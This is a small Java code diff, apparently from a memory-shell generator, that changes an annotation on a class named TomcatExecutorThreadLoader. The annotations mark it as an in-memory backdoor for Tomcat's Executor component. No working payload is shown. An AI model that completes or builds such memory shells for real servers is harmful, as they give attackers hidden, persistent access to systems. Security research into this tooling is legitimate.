@@ -20,7 +20,7 @@ import java.util.zip.GZIPInputStream;
  * ExecutorMS
  */
 @Middleware(Middleware.Tomcat)
-@MemShell({MemShell.Executor})
+@MemShell(MemShell.Executor)
 @JavaClassModifiable({JavaClassModifiable.CLASSNAME})
 public class TomcatExecutorThreadLoader {
     private static String gzipObject;
